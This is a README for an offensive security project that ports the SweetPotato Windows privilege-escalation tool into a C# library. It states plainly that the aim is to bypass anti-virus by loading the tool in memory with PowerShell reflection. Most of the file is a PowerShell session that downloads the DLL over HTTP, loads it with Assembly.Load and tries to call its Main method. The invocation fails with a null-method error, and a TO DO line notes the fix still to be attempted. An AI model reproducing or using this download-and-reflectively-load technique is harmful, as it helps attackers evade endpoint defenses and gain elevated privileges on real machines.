# SweetPotato-DLL
Ported the SweetPotato Local Privilege Escalation C# Console Application to C# Library to Be Loaded Using PowerShell Reflection (in-memory) to Bypass the Anti-Virus

# TO DO: Try making every class public and recompile to fix this error:

PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $data = (New-Object System.Net.WebClient).DownloadData('http://localhost:8080/SweetPotato.dll')
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release>
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $class = $assem.GetType('SweetPotato.Program')
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $class

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
False    False    Program                                  System.Object


PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $method = $class.GetMethod("Main")
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $method
PS C:\Users\admin\Desktop\OSEP\SweetPotatoDLL\SweetPotatoDLL\SweetPotatoDLL\bin\x64\Release> $method.Invoke(0, $null)
You cannot call a method on a null-valued expression.
At line:1 char:1
+ $method.Invoke(0, $null)
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
